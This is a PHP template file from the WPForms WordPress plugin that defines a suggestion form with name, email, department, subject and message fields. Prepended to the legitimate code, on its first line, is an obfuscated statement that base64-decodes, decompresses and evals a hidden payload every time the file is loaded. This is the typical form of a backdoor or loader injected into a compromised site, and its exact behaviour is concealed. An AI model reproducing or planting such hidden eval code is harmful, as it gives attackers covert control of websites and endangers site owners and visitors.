<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Suggestion form template.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.1.3.2
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2016, WPForms LLC
 */
class WPForms_Template_Suggestion extends WPForms_Template {

	/**
	 * Primary class constructor.
	 *
	 * @since 1.0.0
	 */
	public function init() {

		$this->name        = esc_html__( 'Suggestion Form', 'wpforms' );
		$this->slug        = 'suggestion';
		$this->description = esc_html__( 'Ask your users for suggestions with this simple form template. You can add and remove fields as needed.', 'wpforms' );
		$this->includes    = '';
		$this->icon        = '';
		$this->modal       = '';
		$this->core        = true;
		$this->data        = array(
			'field_id' => '5',
			'fields'   => array(
				'0' => array(
					'id'       => '0',
					'type'     => 'name',
					'label'    => esc_html__( 'Name', 'wpforms' ),
					'required' => '1',
					'size'     => 'medium',
				),
				'1' => array(
					'id'          => '1',
					'type'        => 'email',
					'label'       => esc_html__( 'Email', 'wpforms' ),
					'description' => esc_html__( 'Please enter your email, so we can follow up with you.', 'wpforms' ),
					'required'    => '1',
					'size'        => 'medium',
				),
				'2' => array(
					'id'       => '2',
					'type'     => 'radio',
					'label'    => esc_html__( 'Which department do you have a suggestion for?', 'wpforms' ),
					'choices'  => array(
						'1' => array(
							'label' => esc_html__( 'Sales', 'wpforms' ),
						),
						'2' => array(
							'label' => esc_html__( 'Customer Support', 'wpforms' ),
						),
						'3' => array(
							'label' => esc_html__( 'Product Development', 'wpforms' ),
						),
						'4' => array(
							'label' => esc_html__( 'Other', 'wpforms' ),
						),
					),
					'required' => '1',
				),
				'3' => array(
					'id'       => '3',
					'type'     => 'text',
					'label'    => esc_html__( 'Subject', 'wpforms' ),
					'required' => '1',
					'size'     => 'medium',
				),
				'4' => array(
					'id'       => '4',
					'type'     => 'textarea',
					'label'    => esc_html__( 'Message', 'wpforms' ),
					'required' => '1',
					'size'     => 'medium',
				),
			),
			'settings' => array(
				'notifications'               => array(
					'1' => array(
						'replyto'        => '{field_id="1"}',
						'sender_name'    => '{field_id="0"}',
						'sender_address' => '{admin_email}',
					),
				),
				'honeypot'                    => '1',
				'confirmation_message_scroll' => '1',
				'submit_text_processing'      => esc_html__( 'Sending...', 'wpforms' ),
			),
			'meta'     => array(
				'template' => $this->slug,
			),
		);
	}
}

new WPForms_Template_Suggestion;
